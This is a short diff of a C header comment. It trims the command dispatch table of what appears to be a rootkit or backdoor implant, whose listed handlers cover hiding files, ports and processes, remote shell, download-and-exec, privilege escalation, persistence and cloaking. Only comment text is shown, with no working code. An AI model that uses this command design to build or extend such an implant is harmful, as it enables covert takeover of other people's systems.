@@ -18,26 +18,14 @@
  * require an exact-length match.
  *
  * Table entries (prefix -> handler):
- *   "UNHIDE CONTENT " -> cmd_unhide_content
- *   "HIDE CONTENT "   -> cmd_hide_content
- *   "UNHIDE FILE "    -> cmd_unhide_file
- *   "UNHIDE PORT "    -> cmd_unhide_port
- *   "UNHIDE PID "     -> cmd_unhide_pid
- *   "HIDE FILE "      -> cmd_hide_file
- *   "HIDE PORT "      -> cmd_hide_port
- *   "HIDE PID "       -> cmd_hide_pid
- *   "DOWNLOAD "       -> cmd_download
- *   "EXEC "           -> cmd_exec
- *   "LIST "           -> cmd_list
- *   "UNPERSIST"       -> cmd_unpersist
- *   "UNCLOAK"         -> cmd_uncloak
- *   "ESCALATE"        -> cmd_escalate
- *   "PERSIST"         -> cmd_persist
- *   "STATUS"          -> cmd_status
- *   "SHELL"           -> cmd_shell
- *   "CLOAK"           -> cmd_cloak
- *   "PING"            -> cmd_ping
- *   "INFO"            -> cmd_info
+ *   "DOWNLOAD "  -> cmd_download
+ *   "EXEC "      -> cmd_exec
+ *   "UNCLOAK"    -> cmd_uncloak
+ *   "STATUS"     -> cmd_status
+ *   "SHELL"      -> cmd_shell
+ *   "CLOAK"      -> cmd_cloak
+ *   "PING"       -> cmd_ping
+ *   "INFO"       -> cmd_info
  */
 
 /*
